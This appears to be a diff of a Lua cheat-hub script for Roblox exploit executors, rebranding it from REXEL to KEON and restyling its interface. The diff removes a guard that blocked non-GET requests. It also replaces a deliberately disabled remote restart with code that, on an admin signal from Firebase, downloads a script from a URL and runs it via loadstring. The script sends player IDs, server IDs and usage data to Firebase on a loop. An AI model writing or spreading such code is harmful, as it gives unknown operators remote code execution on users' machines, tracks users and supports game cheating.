-    if options and string.upper(tostring(options.Method or "GET")) ~= "GET" then
-        return {StatusCode = 403, Body = "REXEL 11V: remote write requests disabled"}
-    end
     local req = request or http_request or (syn and syn.request) or (http and http.request) or (fluxus and fluxus.request)
     if req then
         local success, response = pcall(function() return req(options) end)
@@ -833,7 +63,7 @@ local function fetchAsset(url, fileName)
     if type(writefile) == "function" and type(assetGetter) == "function" then
         local ext = string.lower(url:match("%.([%w]+)[%?#]?.*$") or "png")
         if ext ~= "png" and ext ~= "jpg" and ext ~= "jpeg" and ext ~= "webp" then ext = "png" end
-        local file = "REXELHub_" .. fileName .. "." .. ext
+        local file = "KEONHub_" .. fileName .. "." .. ext
         local haveFile = false
         if type(isfile) == "function" then
             pcall(function() haveFile = isfile(file) end)
@@ -867,6 +97,7 @@ local function fetchAsset(url, fileName)
 end
 
 local wallUrls = {
+    fetchAsset("https://d.top4top.io/p_3956imcxl0.jpg", "keon_primary_anime_bg"),
     fetchAsset("https://i.ibb.co/kVgc9qDj/73101da42ad70d5caae829c77a61a99f.webp", "bg_animated_v58"),
     fetchAsset("https://g.top4top.io/p_39494o4fm0.png", "bg_new"),
     fetchAsset("https://d.top4top.io/p_3947d1izj0.jpg", "bg_1"),
@@ -886,7 +117,7 @@ local wallNames = {
 }
 
 -- احتفظ بالرابط العام داخل قاعدة البيانات؛ مسار getcustomasset محلي ولا يراه باقي اللاعبين.
-REXELProfile.stickerRawUrls = {
+KEONProfile.stickerRawUrls = {
     "https://up6.cc/2026/10/179301030915811.jpg",
     "https://up6.cc/2026/10/179301030920862.jpg",
     "https://up6.cc/2026/10/179301030923343.jpg",
@@ -894,9 +125,9 @@ REXELProfile.stickerRawUrls = {
     "https://up6.cc/2026/10/179301041828331.jpg",
     "https://up6.cc/2026/10/179301041832562.jpg"
 }
-REXELProfile.stickerUrls = {}
-for i, rawUrl in ipairs(REXELProfile.stickerRawUrls) do
-    REXELProfile.stickerUrls[i] = fetchAsset(rawUrl, "stk_" .. tostring(i))
+KEONProfile.stickerUrls = {}
+for i, rawUrl in ipairs(KEONProfile.stickerRawUrls) do
+    KEONProfile.stickerUrls[i] = fetchAsset(rawUrl, "stk_" .. tostring(i))
 end
 
 local EGG_MAP_IMAGE = fetchAsset("https://k.top4top.io/p_3948flo0t0.jpg", "egg_map")
@@ -911,33 +142,34 @@ local VOTE_START_SOUND_ID = "rbxassetid://18908611063"
 
 local neonSpeed = 3.2
 local currentAccentColor = Color3.fromRGB(235, 35, 65)
-local currentHeaderColor = Color3.fromRGB(65, 8, 24)
+local currentHeaderColor = Color3.fromRGB(218, 47, 57)
 local globalMediaVolume = 5.0
 
 -- تخطيط متجاوب حتى لا تخرج الأزرار عن شاشة الهاتف
 local responsiveState = {
     narrow = false,
-    mainSize = UDim2.new(0, 560, 0, 360),
-    mainPosition = UDim2.new(0.5, -280, 0.5, -180)
+    mainSize = UDim2.new(0, 620, 0, 540),
+    mainPosition = UDim2.new(0.5, -310, 0.5, -270)
 }
 local applyResponsiveMain
 local applyResponsiveChat
 
-local selectedScriptBgIndex = 0
+local selectedScriptBgIndex = 1
 local selectedChatBgIndex = 0
+local favoriteScripts = {}
 local showOwnCountryOverhead = true
 local uiScaleValue = 1.0
 local mainUIScaleObject = nil
-REXELProfile.selectedCountryFlag = "🇮🇶"
-REXELProfile.selectedCountryName = "العراق"
-REXELProfile.selectedCountryCode = "IQ"
-local REXELCountryWasSaved = false
-REXELProfile.profileByUserId = {}
-REXELProfile.savedUsageSeconds = 0
-REXELProfile.usageDataLoaded = false
-REXELProfile.usageStoreWritable = false
-REXELProfile.sessionStartedClock = os.clock()
-REXELProfile.LOCAL_USAGE_FILE = "REXEL_Playtime_" .. tostring(LocalPlayer.UserId) .. ".json"
+KEONProfile.selectedCountryFlag = "🇮🇶"
+KEONProfile.selectedCountryName = "العراق"
+KEONProfile.selectedCountryCode = "IQ"
+local KEONCountryWasSaved = false
+KEONProfile.profileByUserId = {}
+KEONProfile.savedUsageSeconds = 0
+KEONProfile.usageDataLoaded = false
+KEONProfile.usageStoreWritable = false
+KEONProfile.sessionStartedClock = os.clock()
+KEONProfile.LOCAL_USAGE_FILE = "KEON_Playtime_" .. tostring(LocalPlayer.UserId) .. ".json"
 local espEnabled = false
 
 local registeredWingStrokes = {}
@@ -947,6 +179,8 @@ local activeNameLabels = {}
 local function saveUserSettings()
     if writefile then
         local cfg = {
+            version = 66,
+            favoriteScripts = favoriteScripts,
             scriptBg = selectedScriptBgIndex,
             chatBg = selectedChatBgIndex,
             showOwnCountryOverhead = showOwnCountryOverhead,
@@ -957,9 +191,9 @@ local function saveUserSettings()
             hr = currentHeaderColor.R,
             hg = currentHeaderColor.G,
             hb = currentHeaderColor.B,
-            countryFlag = REXELProfile.selectedCountryFlag,
-            countryName = REXELProfile.selectedCountryName,
-            countryCode = REXELProfile.selectedCountryCode
+            countryFlag = KEONProfile.selectedCountryFlag,
+            countryName = KEONProfile.selectedCountryName,
+            countryCode = KEONProfile.selectedCountryCode
         }
         pcall(function() writefile(CONFIG_FILE, HttpService:JSONEncode(cfg)) end)
     end
@@ -970,18 +204,23 @@ local function loadUserSettings()
         pcall(function()
             local cfg = safeDecode(readfile(CONFIG_FILE))
             if cfg then
-                selectedScriptBgIndex = cfg.scriptBg or 0
+                selectedScriptBgIndex = tonumber(cfg.scriptBg) or 1
+                if selectedScriptBgIndex <= 0 then selectedScriptBgIndex = 1 end
                 selectedChatBgIndex = cfg.chatBg or 0
+                if type(cfg.favoriteScripts) == "table" then
+                    favoriteScripts = cfg.favoriteScripts
+                end
                 if cfg.showOwnCountryOverhead ~= nil then showOwnCountryOverhead = cfg.showOwnCountryOverhead end
                 uiScaleValue = math.clamp(tonumber(cfg.uiScaleValue) or 1.0, 0.75, 1.2)
-                REXELProfile.selectedCountryFlag = cfg.countryFlag or REXELProfile.selectedCountryFlag
-                REXELProfile.selectedCountryName = cfg.countryName or REXELProfile.selectedCountryName
-                REXELProfile.selectedCountryCode = cfg.countryCode or REXELProfile.selectedCountryCode
-                REXELCountryWasSaved = cfg.countryCode ~= nil
+                KEONProfile.selectedCountryFlag = cfg.countryFlag or KEONProfile.selectedCountryFlag
+                KEONProfile.selectedCountryName = cfg.countryName or KEONProfile.selectedCountryName
+                KEONProfile.selectedCountryCode = cfg.countryCode or KEONProfile.selectedCountryCode
+                KEONCountryWasSaved = cfg.countryCode ~= nil
                 if cfg.r and cfg.g and cfg.b then
                     currentAccentColor = Color3.new(cfg.r, cfg.g, cfg.b)
                 end
-                if cfg.hr and cfg.hg and cfg.hb then
+                -- Upgrade older configs to the new red panel. V66+ colors remain user-selected.
+                if cfg.version and cfg.version >= 66 and cfg.hr and cfg.hg and cfg.hb then
                     currentHeaderColor = Color3.new(cfg.hr, cfg.hg, cfg.hb)
                 end
             end
@@ -1026,7 +265,7 @@ local function loadAvatarThumbnail(userId, imageLabel)
     end)
 end
 
-function REXELProfile.loadAvatarBodyThumbnail(userId, imageLabel)
+function KEONProfile.loadAvatarBodyThumbnail(userId, imageLabel)
     task.spawn(function()
         pcall(function()
             local thumbType = Enum.ThumbnailType.AvatarThumbnail
@@ -1036,7 +275,7 @@ function REXELProfile.loadAvatarBodyThumbnail(userId, imageLabel)
     end)
 end
 
-function REXELProfile.formatPlayTime(seconds)
+function KEONProfile.formatPlayTime(seconds)
     seconds = math.max(0, math.floor(tonumber(seconds) or 0))
     local hours = math.floor(seconds / 3600)
     local minutes = math.floor((seconds % 3600) / 60)
@@ -1047,7 +286,7 @@ function REXELProfile.formatPlayTime(seconds)
 end
 
 -- اختصار الأرقام الكبيرة في التوب: 950، 1K، 1.2M، 3B، 1T
-function REXELProfile.formatCompactNumber(value)
+function KEONProfile.formatCompactNumber(value)
     value = tonumber(value) or 0
     local absValue = math.abs(value)
     local function compact(divisor, suffix)
@@ -1065,23 +304,23 @@ function REXELProfile.formatCompactNumber(value)
     return tostring(math.floor(value))
 end
 
-REXELProfile.profileByUserId[tostring(LocalPlayer.UserId)] = {
+KEONProfile.profileByUserId[tostring(LocalPlayer.UserId)] = {
     userId = LocalPlayer.UserId,
     name = LocalPlayer.Name,
     displayName = LocalPlayer.DisplayName,
-    countryFlag = REXELProfile.selectedCountryFlag,
-    countryName = REXELProfile.selectedCountryName,
-    countryCode = REXELProfile.selectedCountryCode
+    countryFlag = KEONProfile.selectedCountryFlag,
+    countryName = KEONProfile.selectedCountryName,
+    countryCode = KEONProfile.selectedCountryCode
 }
 
-function REXELProfile.applyCountryTag(plr, flag, countryName)
+function KEONProfile.applyCountryTag(plr, flag, countryName)
     if not plr or not plr.Character then return end
     local head = plr.Character:FindFirstChild("Head")
     if not head then return end
-    local billboard = head:FindFirstChild("REXELCountryFlagTag")
+    local billboard = head:FindFirstChild("KEONCountryFlagTag")
     if not billboard then
         billboard = Instance.new("BillboardGui")
-        billboard.Name = "REXELCountryFlagTag"
+        billboard.Name = "KEONCountryFlagTag"
         billboard.Size = UDim2.new(0, 190, 0, 46)
         billboard.StudsOffset = Vector3.new(0, 4.45, 0)
         billboard.AlwaysOnTop = true
@@ -1090,13 +329,13 @@ function REXELProfile.applyCountryTag(plr, flag, countryName)
         billboard.Parent = head
 
         local brand = Instance.new("TextLabel")
-        brand.Name = "REXELBrandLabel"
+        brand.Name = "KEONBrandLabel"
         brand.Size = UDim2.new(1, 0, 0, 20)
         brand.Position = UDim2.new(0, 0, 0, 0)
         brand.BackgroundColor3 = Color3.fromRGB(3, 10, 24)
         brand.BackgroundTransparency = 0.05
         brand.BorderSizePixel = 0
-        brand.Text = "REXEL999"
+        brand.Text = "KEON999"
         brand.TextColor3 = Color3.fromRGB(100, 220, 255)
         brand.TextStrokeTransparency = 0.35
         brand.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
@@ -1131,47 +370,47 @@ function REXELProfile.applyCountryTag(plr, flag, countryName)
     local label = billboard:FindFirstChild("CountryLabel")
     if label then
         label.Text = tostring(flag or "🌐") .. "  " .. tostring(countryName or "غير محدد")
-        -- الخيار يخفي علم صاحب السكربت فوق رأسه فقط، بينما تبقى علامة REXEL999.
+        -- الخيار يخفي علم صاحب السكربت فوق رأسه فقط، بينما تبقى علامة KEON999.
         label.Visible = (plr ~= LocalPlayer) or showOwnCountryOverhead
     end
-    local brand = billboard:FindFirstChild("REXELBrandLabel")
+    local brand = billboard:FindFirstChild("KEONBrandLabel")
     if brand then brand.Visible = true end
 end
 
-function REXELProfile.refreshCountryTags()
+function KEONProfile.refreshCountryTags()
     for _, plr in ipairs(Players:GetPlayers()) do
-        local profile = REXELProfile.profileByUserId[tostring(plr.UserId)]
+        local profile = KEONProfile.profileByUserId[tostring(plr.UserId)]
         if plr == LocalPlayer then
-            REXELProfile.applyCountryTag(plr, REXELProfile.selectedCountryFlag, REXELProfile.selectedCountryName)
+            KEONProfile.applyCountryTag(plr, KEONProfile.selectedCountryFlag, KEONProfile.selectedCountryName)
         elseif profile then
-            REXELProfile.applyCountryTag(plr, profile.countryFlag, profile.countryName)
+            KEONProfile.applyCountryTag(plr, profile.countryFlag, profile.countryName)
         end
     end
 end
 
-function REXELProfile.publishProfileCountry()
-    REXELProfile.profileByUserId[tostring(LocalPlayer.UserId)] = {
+function KEONProfile.publishProfileCountry()
+    KEONProfile.profileByUserId[tostring(LocalPlayer.UserId)] = {
         userId = LocalPlayer.UserId, name = LocalPlayer.Name,
         displayName = LocalPlayer.DisplayName,
-        countryFlag = REXELProfile.selectedCountryFlag, countryName = REXELProfile.selectedCountryName,
-        countryCode = REXELProfile.selectedCountryCode
+        countryFlag = KEONProfile.selectedCountryFlag, countryName = KEONProfile.selectedCountryName,
+        countryCode = KEONProfile.selectedCountryCode
     }
     saveUserSettings()
-    REXELProfile.refreshCountryTags()
+    KEONProfile.refreshCountryTags()
     task.spawn(function()
         pcall(function()
             customRequest({
                 Url = FIREBASE_BASE_URL .. "/active_users/" .. tostring(LocalPlayer.UserId) .. ".json",
                 Method = "PATCH",
                 Headers = { ["Content-Type"] = "application/json" },
-                Body = HttpService:JSONEncode({countryFlag = REXELProfile.selectedCountryFlag, countryName = REXELProfile.selectedCountryName, countryCode = REXELProfile.selectedCountryCode})
+                Body = HttpService:JSONEncode({countryFlag = KEONProfile.selectedCountryFlag, countryName = KEONProfile.selectedCountryName, countryCode = KEONProfile.selectedCountryCode})
             })
-            if REXELProfile.usageDataLoaded and REXELProfile.usageStoreWritable then
+            if KEONProfile.usageDataLoaded and KEONProfile.usageStoreWritable then
                 customRequest({
                     Url = FIREBASE_BASE_URL .. "/usage_stats/" .. tostring(LocalPlayer.UserId) .. ".json",
                     Method = "PATCH",
                     Headers = { ["Content-Type"] = "application/json" },
-                    Body = HttpService:JSONEncode({countryFlag = REXELProfile.selectedCountryFlag, countryName = REXELProfile.selectedCountryName, countryCode = REXELProfile.selectedCountryCode})
+                    Body = HttpService:JSONEncode({countryFlag = KEONProfile.selectedCountryFlag, countryName = KEONProfile.selectedCountryName, countryCode = KEONProfile.selectedCountryCode})
                 })
             end
         end)
@@ -1179,17 +418,17 @@ function REXELProfile.publishProfileCountry()
 end
 
 Players.PlayerAdded:Connect(function(plr)
-    plr.CharacterAdded:Connect(function() task.wait(1); REXELProfile.refreshCountryTags() end)
+    plr.CharacterAdded:Connect(function() task.wait(1); KEONProfile.refreshCountryTags() end)
 end)
 for _, plr in ipairs(Players:GetPlayers()) do
-    plr.CharacterAdded:Connect(function() task.wait(1); REXELProfile.refreshCountryTags() end)
+    plr.CharacterAdded:Connect(function() task.wait(1); KEONProfile.refreshCountryTags() end)
 end
 
 ---------------------------------------------------------
 -- شاشة إعادة تشغيل السكربت نفسه لجميع المستخدمين
 ---------------------------------------------------------
 local ReloadGui = Instance.new("ScreenGui")
-ReloadGui.Name = "REXELReloadWidgetGui"
+ReloadGui.Name = "KEONReloadWidgetGui"
 ReloadGui.ResetOnSpawn = false
 ReloadGui.Parent = parent
 
@@ -1225,7 +464,7 @@ local ReloadDevNameLbl = Instance.new("TextLabel")
 ReloadDevNameLbl.Size = UDim2.new(0, 180, 0, 20)
 ReloadDevNameLbl.Position = UDim2.new(0, 66, 0, 10)
 ReloadDevNameLbl.BackgroundTransparency = 1
-ReloadDevNameLbl.Text = "✦ REXEL • إعادة تشغيل النظام"
+ReloadDevNameLbl.Text = "✦ KEON • إعادة تشغيل النظام"
 ReloadDevNameLbl.TextColor3 = Color3.fromRGB(255, 215, 0)
 ReloadDevNameLbl.Font = Enum.Font.GothamBold
 ReloadDevNameLbl.TextSize = 12
@@ -1270,7 +509,7 @@ ReloadTimerLbl.TextXAlignment = Enum.TextXAlignment.Center
 ReloadTimerLbl.ZIndex = 801
 ReloadTimerLbl.Parent = ReloadFrame
 
-local RELOAD_SEEN_FILE = "REXEL_ReloadSeen_" .. tostring(LocalPlayer.UserId) .. ".txt"
+local RELOAD_SEEN_FILE = "KEON_ReloadSeen_" .. tostring(LocalPlayer.UserId) .. ".txt"
 local lastReloadId = nil
 pcall(function()
     if type(readfile) == "function" and type(isfile) == "function" and isfile(RELOAD_SEEN_FILE) then
@@ -1304,17 +543,24 @@ task.spawn(function()
                         ReloadTimerLbl.Text = "⟳ جارٍ إعادة تشغيل النظام…"
                         task.wait(0.5)
                         
-                        if type(REXEL_RESTART_SCRIPT_URL) ~= "string" or REXEL_RESTART_SCRIPT_URL == "" then
-                            ReloadReasonLbl.Text = "لم تُضبط وصلة RAW لنسخة REXEL؛ أبقينا الواجهة حتى لا تُغلق بلا إعادة تشغيل."
-                            ReloadTimerLbl.Text = "أضف رابط REXEL المنشور لتفعيل إعادة التشغيل"
+                        if type(KEON_RESTART_SCRIPT_URL) ~= "string" or KEON_RESTART_SCRIPT_URL == "" then
+                            ReloadReasonLbl.Text = "لم تُضبط وصلة RAW لنسخة KEON؛ أبقينا الواجهة حتى لا تُغلق بلا إعادة تشغيل."
+                            ReloadTimerLbl.Text = "أضف رابط KEON المنشور لتفعيل إعادة التشغيل"
                             task.wait(5)
                             ReloadFrame.Visible = false
                         else
-                            -- Remote code execution is intentionally disabled in REXEL 9V.
-                            ReloadReasonLbl.Text = "إعادة التشغيل عن بُعد غير مفعّلة في هذا الإصدار."
-                            ReloadTimerLbl.Text = "أعد تشغيل REXEL يدوياً بعد التحديث"
-                            task.wait(5)
-                            ReloadFrame.Visible = false
+                            if parent:FindFirstChild("KEONProV47UI") then parent.KEONProV47UI:Destroy() end
+                            if parent:FindFirstChild("KEONTopChatGui") then parent.KEONTopChatGui:Destroy() end
+                            if parent:FindFirstChild("KEONVoteBannerGui") then parent.KEONVoteBannerGui:Destroy() end
+                            if parent:FindFirstChild("KEONEventWidgetGui") then parent.KEONEventWidgetGui:Destroy() end
+                            if parent:FindFirstChild("KEONReloadWidgetGui") then parent.KEONReloadWidgetGui:Destroy() end
+                            task.spawn(function()
+                                local ok, source = pcall(function() return game:HttpGet(KEON_RESTART_SCRIPT_URL) end)
+                                if ok and type(source) == "string" and #source > 100 then
+                                    local compileOk, compiled = pcall(loadstring, source)
+                                    if compileOk and type(compiled) == "function" then pcall(compiled) end
+                                end
+                            end)
                         end
                     end
                 end
@@ -1328,7 +574,7 @@ end)
 -- شاشة واجهة التصويت المباشر التفاعلية
 ---------------------------------------------------------
 local VoteGui = Instance.new("ScreenGui")
-VoteGui.Name = "REXELVoteBannerGui"
+VoteGui.Name = "KEONVoteBannerGui"
 VoteGui.ResetOnSpawn = false
 VoteGui.Parent = parent
 
@@ -1367,7 +613,7 @@ local DevNameLbl = Instance.new("TextLabel")
 DevNameLbl.Size = UDim2.new(0, 140, 0, 20)
 DevNameLbl.Position = UDim2.new(0, 68, 0, 10)
 DevNameLbl.BackgroundTransparency = 1
-DevNameLbl.Text = "✦ REXEL • تصويت مباشر"
+DevNameLbl.Text = "✦ KEON • تصويت مباشر"
 DevNameLbl.TextColor3 = Color3.fromRGB(255, 215, 0)
 DevNameLbl.Font = Enum.Font.GothamBold
 DevNameLbl.TextSize = 12
@@ -1545,7 +791,7 @@ local function checkAdminActions()
                 if data.bans and data.bans[uidStr] then
                     local banInfo = data.bans[uidStr]
                     local BanGui = Instance.new("ScreenGui")
-                    BanGui.Name = "REXELBanScreenGui"
+                    BanGui.Name = "KEONBanScreenGui"
                     BanGui.ResetOnSpawn = false
                     BanGui.Parent = parent
                     
@@ -1564,7 +810,7 @@ local function checkAdminActions()
                     local bTitle = Instance.new("TextLabel")
                     bTitle.Size = UDim2.new(1, 0, 0, 50)
                     bTitle.BackgroundTransparency = 1
-                    bTitle.Text = "⛔ تم تقييد الوصول إلى REXEL"
+                    bTitle.Text = "⛔ تم تقييد الوصول إلى KEON"
                     bTitle.TextColor3 = Color3.fromRGB(255, 50, 50)
                     bTitle.Font = Enum.Font.GothamBold
                     bTitle.TextSize = 16
@@ -1619,10 +865,10 @@ task.spawn(function()
                     placeId = game.PlaceId,
                     jobId = game.JobId,
                     lastSeen = os.time(),
-                    countryFlag = REXELProfile.selectedCountryFlag,
-                    countryName = REXELProfile.selectedCountryName,
-                    countryCode = REXELProfile.selectedCountryCode,
-                    totalSeconds = REXELProfile.savedUsageSeconds + math.floor(os.clock() - REXELProfile.sessionStartedClock),
+                    countryFlag = KEONProfile.selectedCountryFlag,
+                    countryName = KEONProfile.selectedCountryName,
+                    countryCode = KEONProfile.selectedCountryCode,
+                    totalSeconds = KEONProfile.savedUsageSeconds + math.floor(os.clock() - KEONProfile.sessionStartedClock),
                     eggSpeed = eggSpeed,
                     eggMoney = eggMoney,
                     eggUpdatedAt = os.time()
@@ -1637,38 +883,38 @@ end)
 task.spawn(function()
     -- Local backup first, so a temporary network failure never wipes a player's saved time.
     pcall(function()
-        if readfile and isfile and isfile(REXELProfile.LOCAL_USAGE_FILE) then
-            local localRecord = safeDecode(readfile(REXELProfile.LOCAL_USAGE_FILE))
+        if readfile and isfile and isfile(KEONProfile.LOCAL_USAGE_FILE) then
+            local localRecord = safeDecode(readfile(KEONProfile.LOCAL_USAGE_FILE))
             if type(localRecord) == "table" then
-                REXELProfile.savedUsageSeconds = math.max(0, tonumber(localRecord.totalSeconds) or 0)
+                KEONProfile.savedUsageSeconds = math.max(0, tonumber(localRecord.totalSeconds) or 0)
             end
         end
     end)
     pcall(function()
         local res = customRequest({Url = FIREBASE_BASE_URL .. "/usage_stats/" .. tostring(LocalPlayer.UserId) .. ".json", Method = "GET"})
         if res and res.StatusCode == 200 then
-            REXELProfile.usageStoreWritable = true
+            KEONProfile.usageStoreWritable = true
             local data = safeDecode(res.Body)
             if type(data) == "table" then
-                REXELProfile.savedUsageSeconds = math.max(REXELProfile.savedUsageSeconds, tonumber(data.totalSeconds) or 0)
+                KEONProfile.savedUsageSeconds = math.max(KEONProfile.savedUsageSeconds, tonumber(data.totalSeconds) or 0)
             end
         end
     end)
-    REXELProfile.usageDataLoaded = true
+    KEONProfile.usageDataLoaded = true
 end)
 
 task.spawn(function()
     while true do
         task.wait(20)
-        if REXELProfile.usageDataLoaded then
-            local elapsed = math.max(0, math.floor(os.clock() - REXELProfile.sessionStartedClock))
-            local totalSeconds = REXELProfile.savedUsageSeconds + elapsed
+        if KEONProfile.usageDataLoaded then
+            local elapsed = math.max(0, math.floor(os.clock() - KEONProfile.sessionStartedClock))
+            local totalSeconds = KEONProfile.savedUsageSeconds + elapsed
             pcall(function()
                 if type(writefile) == "function" then
-                    writefile(REXELProfile.LOCAL_USAGE_FILE, HttpService:JSONEncode({totalSeconds = totalSeconds, updatedAt = os.time()}))
+                    writefile(KEONProfile.LOCAL_USAGE_FILE, HttpService:JSONEncode({totalSeconds = totalSeconds, updatedAt = os.time()}))
                 end
             end)
-            if REXELProfile.usageStoreWritable then
+            if KEONProfile.usageStoreWritable then
                 pcall(function()
                     local eggSpeed, eggMoney = readLocalEggStats()
                     customRequest({
@@ -1680,9 +926,9 @@ task.spawn(function()
                             name = LocalPlayer.Name,
                             displayName = LocalPlayer.DisplayName,
                             totalSeconds = totalSeconds,
-                            countryFlag = REXELProfile.selectedCountryFlag,
-                            countryName = REXELProfile.selectedCountryName,
-                            countryCode = REXELProfile.selectedCountryCode,
+                            countryFlag = KEONProfile.selectedCountryFlag,
+                            countryName = KEONProfile.selectedCountryName,
+                            countryCode = KEONProfile.selectedCountryCode,
                             eggSpeed = eggSpeed,
                             eggMoney = eggMoney,
                             eggUpdatedAt = os.time(),
@@ -1699,7 +945,7 @@ end)
 -- نظام البرودكاست المباشر
 ---------------------------------------------------------
 local BroadcastGui = Instance.new("ScreenGui")
-BroadcastGui.Name = "REXELAdminBroadcastGui"
+BroadcastGui.Name = "KEONAdminBroadcastGui"
 BroadcastGui.ResetOnSpawn = false
 BroadcastGui.Parent = parent
 
@@ -1795,9 +1041,8 @@ end
 -- شاشة التحميل الفخمة
 ---------------------------------------------------------
 local LoadingGui = Instance.new("ScreenGui")
-LoadingGui.Name = "REXELLoadingGui"
+LoadingGui.Name = "KEONLoadingGui"
 LoadingGui.ResetOnSpawn = false
-LoadingGui.Enabled = false
 LoadingGui.Parent = parent
 
 local LoadFrame = Instance.new("Frame")
@@ -1835,7 +1080,7 @@ local LoadTitle = Instance.new("TextLabel")
 LoadTitle.Size = UDim2.new(1, 0, 0, 25)
 LoadTitle.Position = UDim2.new(0, 0, 0, 72)
 LoadTitle.BackgroundTransparency = 1
-LoadTitle.Text = "⚡ REXEL // OVERDRIVE"
+LoadTitle.Text = "⚡ KEON // OVERDRIVE"
 LoadTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
 LoadTitle.Font = Enum.Font.GothamBlack
 LoadTitle.TextSize = 18
@@ -1845,7 +1090,7 @@ local LoadSub = Instance.new("TextLabel")
 LoadSub.Size = UDim2.new(1, -18, 0, 30)
 LoadSub.Position = UDim2.new(0, 9, 0, 96)
 LoadSub.BackgroundTransparency = 1
-LoadSub.Text = "نظام نيون قتالي • إصدار المطور REXEL"
+LoadSub.Text = "نظام نيون قتالي • إصدار المطور KEON"
 LoadSub.TextColor3 = Color3.fromRGB(170, 205, 235)
 LoadSub.Font = Enum.Font.GothamBold
 LoadSub.TextWrapped = true
@@ -1899,16 +1144,15 @@ end)
 -- الهيكل الرئيسي للواجهة
 ---------------------------------------------------------
 local ScreenGui = Instance.new("ScreenGui")
-ScreenGui.Name = "REXELAdvancedFeaturesUI"
-ScreenGui.DisplayOrder = 9
+ScreenGui.Name = "KEONProV47UI"
+ScreenGui.DisplayOrder = 10
 ScreenGui.ResetOnSpawn = false
-ScreenGui.Enabled = false
 ScreenGui.Parent = parent
 
 local MainFrame = Instance.new("Frame")
 MainFrame.Name = "MainFrame"
-MainFrame.Size = UDim2.new(0, 560, 0, 360)
-MainFrame.Position = UDim2.new(0.5, -280, 0.5, -180)
+MainFrame.Size = UDim2.new(0, 520, 0, 620)
+MainFrame.Position = UDim2.new(0.64, 0, 0.56, 0)
 MainFrame.BackgroundTransparency = 1
 MainFrame.Active = true
 MainFrame.Draggable = true
@@ -1916,36 +1160,36 @@ MainFrame.Visible = false
 MainFrame.Parent = ScreenGui
 MainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
 mainUIScaleObject = Instance.new("UIScale")
-mainUIScaleObject.Name = "REXELUserInterfaceScale"
-mainUIScaleObject.Scale = uiScaleValue
+mainUIScaleObject.Name = "KEONUserInterfaceScale"
+mainUIScaleObject.Scale = math.clamp(uiScaleValue, 0.85, 1.0)
 mainUIScaleObject.Parent = MainFrame
 
 local CenterGlow = Instance.new("Frame")
 CenterGlow.Name = "PS5SoftGlow"
-CenterGlow.Size = UDim2.new(0, 350, 1, 8)
-CenterGlow.Position = UDim2.new(0.5, -175, 0, -4)
-CenterGlow.BackgroundColor3 = Color3.fromRGB(0, 126, 255)
-CenterGlow.BackgroundTransparency = 0.91
+CenterGlow.Size = UDim2.new(1, 8, 1, 8)
+CenterGlow.Position = UDim2.new(0, -4, 0, -4)
+CenterGlow.BackgroundColor3 = Color3.fromRGB(218, 47, 57)
+CenterGlow.BackgroundTransparency = 1
 CenterGlow.BorderSizePixel = 0
 CenterGlow.ZIndex = 0
 CenterGlow.Parent = MainFrame
-Instance.new("UICorner", CenterGlow).CornerRadius = UDim.new(0, 19)
+Instance.new("UICorner", CenterGlow).CornerRadius = UDim.new(0, 2)
 
 local CenterBox = Instance.new("Frame")
 CenterBox.Name = "CenterBox"
-CenterBox.Size = UDim2.new(0, 340, 1, 0)
-CenterBox.Position = UDim2.new(0.5, -170, 0, 0)
-CenterBox.BackgroundColor3 = Color3.fromRGB(7, 13, 26)
+CenterBox.Size = UDim2.new(1, 0, 1, 0)
+CenterBox.Position = UDim2.new(0, 0, 0, 0)
+CenterBox.BackgroundColor3 = Color3.fromRGB(17, 19, 24)
 CenterBox.BackgroundTransparency = 0
 CenterBox.BorderSizePixel = 0
 CenterBox.ClipsDescendants = true
 CenterBox.Parent = MainFrame
-Instance.new("UICorner", CenterBox).CornerRadius = UDim.new(0, 16)
+Instance.new("UICorner", CenterBox).CornerRadius = UDim.new(0, 2)
 local centerSurfaceGradient = Instance.new("UIGradient")
 centerSurfaceGradient.Color = ColorSequence.new({
-    ColorSequenceKeypoint.new(0, Color3.fromRGB(8, 20, 42)),
-    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(7, 14, 28)),
-    ColorSequenceKeypoint.new(1, Color3.fromRGB(5, 10, 22))
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(29, 31, 38)),
+    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(18, 20, 25)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(12, 14, 18))
 })
 centerSurfaceGradient.Rotation = 110
 centerSurfaceGradient.Parent = CenterBox
@@ -1959,29 +1203,30 @@ BgImage.Visible = false
 BgImage.ScaleType = Enum.ScaleType.Crop
 BgImage.ZIndex = 1
 BgImage.Parent = CenterBox
-Instance.new("UICorner", BgImage).CornerRadius = UDim.new(0, 14)
+Instance.new("UICorner", BgImage).CornerRadius = UDim.new(0, 2)
 
 -- دالة تطبيق الخلفية المتحركة أو العادية بدقة وتجنب السواد تماماً للجوال
 local function applyScriptBackground(idx)
     idx = tonumber(idx) or 0
     selectedScriptBgIndex = idx
+    -- Requested primary wallpaper: show it behind the KEON panel content.
     if idx > 0 and wallUrls[idx] then
         BgImage.Image = wallUrls[idx]
         BgImage.Visible = true
-        CenterBox.BackgroundTransparency = 0
-        CenterBox.BackgroundColor3 = Color3.fromRGB(7, 13, 26)
-        BgImage.ImageTransparency = 0
+        BgImage.ImageTransparency = 0.18
     else
-        BgImage.Image = ""
-        BgImage.Visible = false
-        CenterBox.BackgroundTransparency = 0
-        CenterBox.BackgroundColor3 = Color3.fromRGB(7, 13, 26)
+        BgImage.Image = wallUrls[1] or ""
+        BgImage.Visible = true
+        BgImage.ImageTransparency = 0.18
     end
+    CenterBox.BackgroundTransparency = 0.08
+    CenterBox.BackgroundColor3 = Color3.fromRGB(17, 19, 24)
     saveUserSettings()
 end
 applyScriptBackground(selectedScriptBgIndex)
 
 local centerStroke = Instance.new("UIStroke")
+centerStroke.Name = "KEONPanelBorder"
 centerStroke.Color = currentAccentColor
 centerStroke.Thickness = 1.7
 centerStroke.Parent = CenterBox
@@ -2004,14 +1249,15 @@ task.spawn(function()
 end)
 
 local Header = Instance.new("Frame")
-Header.Size = UDim2.new(1, 0, 0, 44)
-Header.BackgroundColor3 = currentHeaderColor
+Header.Name = "Header"
+Header.Size = UDim2.new(1, 0, 0, 52)
+Header.BackgroundColor3 = Color3.fromRGB(218, 47, 57)
 Header.BorderSizePixel = 0
 Header.ZIndex = 3
 Header.Parent = CenterBox
-Instance.new("UICorner", Header).CornerRadius = UDim.new(0, 16)
+Instance.new("UICorner", Header).CornerRadius = UDim.new(0, 2)
